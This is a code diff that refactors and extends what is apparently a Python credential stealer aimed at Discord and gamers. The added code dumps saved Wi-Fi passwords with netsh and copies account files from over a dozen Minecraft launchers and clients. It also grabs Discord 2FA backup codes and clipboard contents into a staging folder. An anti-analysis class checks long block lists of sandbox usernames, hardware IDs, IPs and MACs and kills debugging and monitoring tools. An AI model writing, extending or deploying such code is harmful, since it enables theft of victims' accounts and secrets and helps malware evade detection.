@@ -9,6 +9,7 @@ import sqlite3
 import subprocess
 import sys
 import threading
+import pyperclip
 import time
 from typing import Union
 from multiprocessing import cpu_count
@@ -722,76 +723,83 @@ class Wifi:
         self.wifi_list = []
         self.name_pass = {}
 
-        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
-        for line in data:
+        profiles_output = subprocess.getoutput('netsh wlan show profiles')
+        for line in profiles_output.split('\n'):
             if 'All User Profile' in line:
-                self.wifi_list.append(line.split(":")[-1][1:])
-                self.wifi_info()
+                self.wifi_list.append(line.split(":")[-1].strip())
 
-    def wifi_info(self):
-        for i in self.wifi_list:
-            command = subprocess.getoutput(
-                f'netsh wlan show profile "{i}" key=clear')
-            if "Key Content" in command:
-                split_key = command.split('Key Content')
-                tmp = split_key[1].split('\n')[0]
-                key = tmp.split(': ')[1]
-                self.name_pass[i] = key
-            else:
-                key = ""
-                self.name_pass[i] = key
+        for profile_name in self.wifi_list:
+            command_output = subprocess.getoutput(f'netsh wlan show profile "{profile_name}" key=clear')
+            key = self.extract_key(command_output)
+            self.name_pass[profile_name] = key
+
+        self.save_wifi_passwords()
+
+    def extract_key(self, output):
+        if "Key Content" in output:
+            key_content = output.split('Key Content')[1].split('\n')[0].strip()
+            return key_content.split(': ')[1].strip()
+        else:
+            return ""
+
+    def save_wifi_passwords(self):
         os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
         with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
-            for i, j in self.name_pass.items():
-                f.write(f'Wifi Name : {i} | Password : {j}\n')
-        f.close()
+            for wifi_name, password in self.name_pass.items():
+                f.write(f'Wifi Name : {wifi_name} | Password : {password}\n')
 
 
 class Minecraft:
     def __init__(self):
         self.roaming = os.getenv("appdata")
-        self.accounts_path = "\\.minecraft\\launcher_accounts.json"
-        self.usercache_path = "\\.minecraft\\usercache.json"
+        self.user_profile = os.getenv("userprofile")
+        self.minecraft_paths = {
+            "Launcher": os.path.join(self.roaming, ".minecraft", "launcher_accounts.json"),
+            "Lunar": os.path.join(self.user_profile, ".lunarclient", "settings", "game", "accounts.json"),
+            "TLauncher": os.path.join(self.roaming, ".minecraft", "TlauncherProfiles.json"),
+            "Feather": os.path.join(self.roaming, ".feather", "accounts.json"),
+            "Meteor": os.path.join(self.roaming, ".minecraft", "meteor-client", "accounts.nbt"),
+            "Impact": os.path.join(self.roaming, ".minecraft", "Impact", "alts.json"),
+            "Novoline": os.path.join(self.roaming, ".minectaft", "Novoline", "alts.novo"),
+            "CheatBreakers": os.path.join(self.roaming, ".minecraft", "cheatbreaker_accounts.json"),
+            "Microsoft Store": os.path.join(self.roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
+            "Rise": os.path.join(self.roaming, ".minecraft", "Rise", "alts.txt"),
+            "Rise (Intent)": os.path.join(self.user_profile, "intentlauncher", "Rise", "alts.txt"),
+            "Paladium": os.path.join(self.roaming, "paladium-group", "accounts.json"),
+            "PolyMC": os.path.join(self.roaming, "PolyMC", "accounts.json"),
+            "Badlion": os.path.join(self.roaming, "Badlion Client", "accounts.json"),
+        }
 
-        if os.path.exists(os.path.join(self.roaming, ".minecraft")):
-            os.makedirs(os.path.join(temp_path, "Minecraft"), exist_ok=True)
-            try:
-                self.session_info()
-                self.user_cache()
-            except Exception as e:
-                print(e)
+        self.retrieve_minecraft_data()
 
-    def session_info(self):
-        with open(os.path.join(temp_path, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
-            with open(self.roaming + self.accounts_path, "r") as g:
-                self.session = json.load(g)
-                f.write(json.dumps(self.session, indent=4))
-        f.close()
-
-    def user_cache(self):
-        with open(os.path.join(temp_path, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
-            with open(self.roaming + self.usercache_path, "r") as g:
-                self.user = json.load(g)
-                f.write(json.dumps(self.user, indent=4))
-        f.close()
+    def retrieve_minecraft_data(self):
+        for name, path in self.minecraft_paths.items():
+            if os.path.isfile(path):
+                try:
+                    minecraft_folder = os.path.join(os.path.join(temp_path, "Minecraft"), name)
+                    os.makedirs(minecraft_folder, exist_ok=True)
+                    copy2(path, os.path.join(minecraft_folder, os.path.basename(path)))
+                except Exception as e:
+                    print(e)
 
 
 class BackupCodes:
     def __init__(self):
         self.path = os.environ["HOMEPATH"]
-        self.code_path = '\\Downloads\\discord_backup_codes.txt'
-        self.get_codes()
+        self.backup_code_regex= re.compile(r'discord_backup_codes.*\.txt', re.IGNORECASE)
+        self.get_backup_codes()
 
-    def get_codes(self):
-        if os.path.exists(self.path + self.code_path):
-            os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
-            with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
-                with open(self.path + self.code_path, 'r') as g:
-                    for line in g.readlines():
-                        if line.startswith("*"):
-                            f.write(line)
-            f.close()
-
+    def get_backup_codes(self):
+        backup_codes_found = False
+        os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
+        for filename in os.listdir(os.path.join(self.path, 'Downloads')):
+            if self.backup_code_regex.match(filename):
+                copy2(os.path.join(self.path, 'Downloads', filename), os.path.join(temp_path, "Discord", "2FA Backup Codes_" + filename))
+                backup_codes_found = True
+        
+        if not backup_codes_found:
+            with open(os.path.join(temp_path, "Discord", "No Backup Codes Found.txt"), "w") as f:
+                f.write("No backup codes were found.")
 
 class AntiSpam:
     def __init__(self):
@@ -800,20 +808,20 @@ class AntiSpam:
 
     def check_time(self) -> bool:
         current_time = time.time()
+        file_path = os.path.join(temp, "dd_setup.txt")
         try:
-            with open(f"{temp}\\dd_setup.txt", "r") as f:
-                code = f.read()
-                if code != "":
-                    old_time = float(code)
-                    if current_time - old_time > 60:
-                        with open(f"{temp}\\dd_setup.txt", "w") as f:
-                            f.write(str(current_time))
-                        return False
-                    else:
-                        return True
-        except FileNotFoundError:
-            with open(f"{temp}\\dd_setup.txt", "w") as g:
-                g.write(str(current_time))
+            if os.path.exists(file_path):
+                file_modified_time = os.path.getmtime(file_path)
+                if current_time - file_modified_time > 60:
+                    os.utime(file_path, (current_time, current_time))
+                    return False
+                else:
+                    return True
+            else:
+                with open(file_path, "w") as f:
+                    f.write(str(current_time))
+                return False
+        except Exception:
             return False
 
 
@@ -841,21 +849,19 @@ del "%~f0"
 
 
 class Clipboard:
-    def __init__(self) -> None:
+    def __init__(self):
         self.directory = os.path.join(temp_path, "Clipboard")
         os.makedirs(self.directory, exist_ok=True)
         self.get_clipboard()
 
-    def get_clipboard(self) -> None:
-        process = subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True)
-        if process.returncode == 0:
-            content = process.stdout.decode(errors="ignore").strip()
-            if content:
-                with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
-                    file.write(content)
-            else:
-                with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
-                    file.write("Clipboard is empty")
+    def get_clipboard(self):
+        content = pyperclip.paste()
+        if content:
+            with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
+                file.write(content)
+        else:
+            with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
+                file.write("Clipboard is empty")
 
 
 class Injection:
@@ -921,17 +927,17 @@ class Debug:
     def checks(self):
         debugging = False
 
-        self.blackListedUsers = [
+        blacklisted_users = {
             'WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
             'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise',
-            'User01', 'test', 'RGzcBUyrznReg']
-        self.blackListedPCNames = [
+            'User01', 'test', 'RGzcBUyrznReg'}
+        blacklisted_pc_names = {
             'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
             'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
             'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M',
             'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
-            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
-        self.blackListedHWIDS = [
+            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42'}
+        blacklisted_hwids = {
             '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
             '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
             '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
@@ -964,16 +970,16 @@ class Debug:
             '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57',
             'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
             'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
-            '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
-        self.blackListedIPS = [
+            '921E2042-70D3-F9F1-8CBD-B398A21F89C6'}
+        blacklisted_ips = {
             '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
             '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
             '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
             '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
             '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
             '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
-            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
-        self.blackListedMacs = [
+            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107'}
+        blacklisted_macs = {
             '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
             '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40',
             '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01',
@@ -992,22 +998,23 @@ class Debug:
             '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33',
             '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
             '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
-            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
-        self.blacklistedProcesses = [
+            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e'}
+        blacklisted_processes = {
             "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
             "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
-            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
+            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"}
 
-        self.check_process()
-        if self.get_network():
+        if self.check_process(blacklisted_processes):
             debugging = True
-        if self.get_system():
+        if self.get_network(blacklisted_ips, blacklisted_macs):
+            debugging = True
+        if self.get_system(blacklisted_users, blacklisted_pc_names, blacklisted_hwids):
             debugging = True
         return debugging
 
-    def check_process(self) -> bool:
+    def check_process(self, blacklisted_processes) -> bool:
         for proc in psutil.process_iter():
-            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
+            if any(procstr in proc.name().lower() for procstr in blacklisted_processes):
                 try:
                     proc.kill()
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
@@ -1015,30 +1022,30 @@ class Debug:
         if sys.gettrace():
             sys.exit(0)
 
-    def get_network(self) -> bool:
-        ip = requests.get('https://api.ipify.org').text
-        interface, addrs = next(iter(psutil.net_if_addrs().items()))
-        mac = addrs[0].address
+    def get_network(self, blacklisted_ips, blacklisted_macs) -> bool:
+        try:
+            network_interfaces = psutil.net_if_addrs()
+            for interface, addresses in network_interfaces.items():
+                for address in addresses:
+                    if address.address in blacklisted_ips or address.address in blacklisted_macs:
+                        return True
+        except Exception:
+            pass
+        return False
 
-        if ip in self.blackListedIPS:
-            return True
-        if mac in self.blackListedMacs:
-            return True
+    def get_system(self, blacklisted_users, blacklisted_pc_names, blacklisted_hwids) -> bool:
+        try:
+            if os.getenv('USERNAME').lower() in blacklisted_users or os.getenv('COMPUTERNAME').lower() in blacklisted_pc_names:
+                return True
+            with subprocess.Popen("wmic csproduct get uuid", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) as p:
+                hwid = p.stdout.read().decode('utf-8').strip().split('\n')[1].strip()
+                if hwid.lower() in blacklisted_hwids:
+                    return True
+        except Exception:
+            pass
+        return False
 
-    def get_system(self) -> bool:
-        username = os.getenv("UserName")
-        hostname = os.getenv("COMPUTERNAME")
-        hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
-                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
-
-        if hwid in self.blackListedHWIDS:
-            return True
-        if username in self.blackListedUsers:
-            return True
-        if hostname in self.blackListedPCNames:
-            return True
-
-    def self_destruct(self) -> None:
+    def self_destruct(self):
         sys.exit(0)
 
 
